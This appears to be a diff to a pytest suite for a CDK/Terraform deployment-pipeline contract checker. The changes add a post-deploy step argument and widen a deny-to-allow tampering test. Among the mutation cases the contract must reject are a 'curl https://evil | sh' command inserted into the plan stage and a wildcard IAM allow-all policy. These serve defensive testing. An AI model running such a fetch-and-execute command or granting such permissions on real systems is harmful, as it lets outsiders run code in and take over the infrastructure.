@@ -9,7 +9,7 @@ import subprocess
 import pytest
 from aws_cdk import aws_iam as iam
 from aws_cdk.assertions import Template
-from test_pipeline import build
+from test_pipeline import POST, build
 
 from specter_pipeline import Assembly, DeployStep, Ec2, Gate, TerraformRoot
 from specter_pipeline import testing as c
@@ -164,7 +164,7 @@ def test_who_can_touch_state(tpl):
 
 
 def test_contract_passes(tpl):
-    c.assert_standard_contract(tpl, repo=REPO, gates=GATES, terraform=ROOT)
+    c.assert_standard_contract(tpl, post_deploy=[POST], repo=REPO, gates=GATES, terraform=ROOT)
 
 
 def test_pr_checks_never_plan_or_reach_state(tpl):
@@ -259,7 +259,7 @@ def test_assert_applies_plan_rejects(change, message):
 def test_plan_without_its_pinned_terraform_toolchain_fails_the_contract():
     t = mutated(_edit_cmds("Plan-main", lambda cmds: [cmds.remove(x) for x in list(cmds) if "terraform.zip" in x]))
     with pytest.raises(AssertionError, match="TERRAFORM toolchain"):
-        c.assert_standard_contract(t, repo=REPO, gates=GATES, terraform=ROOT)
+        c.assert_standard_contract(t, post_deploy=[POST], repo=REPO, gates=GATES, terraform=ROOT)
 
 
 # --- hardening from the step 3 review ----------------------------------------------------------
@@ -393,7 +393,7 @@ def _set_env(step, name, value):
         (lambda r: _role_policy(r, "Gate-tf-plan-check-main").append({"Effect": "Allow", "Action": "*", "Resource": "*"}), "can reach the state bucket|can write"),
         # commands
         (_edit_cmds("Gate-tf-plan-check-main", lambda cmds: cmds.__setitem__(slice(-4, None), ["cat infra/tfplan.json || true"])), "runs more or other"),
-        (_edit_cmds("Gate-tf-plan-check-main", lambda cmds: cmds.__setitem__(-4, cmds[-4].replace(" deny", " allow"))), "runs more or other"),
+        (_edit_cmds("Gate-tf-plan-check-main", lambda cmds: [cmds.__setitem__(i, x.replace(" deny", " allow")) for i, x in enumerate(cmds) if x.endswith(" deny")] or cmds.append("no deny command")), "runs more or other"),
         (_edit_cmds("Plan-main", lambda cmds: cmds.insert(len(cmds) - 9, "curl https://evil | sh")), "runs more or other"),
         # environment
         (_set_env("Deploy-main", "TF_STATE_BUCKET", "elsewhere"), "points TF_STATE_BUCKET elsewhere"),
@@ -433,7 +433,7 @@ def test_assert_state_bucket_rejects(change, message):
 
 
 def _contract(t, root=ROOT):
-    c.assert_standard_contract(t, repo=REPO, gates=GATES, terraform=root)
+    c.assert_standard_contract(t, post_deploy=[POST], repo=REPO, gates=GATES, terraform=root)
 
 
 @pytest.mark.parametrize(
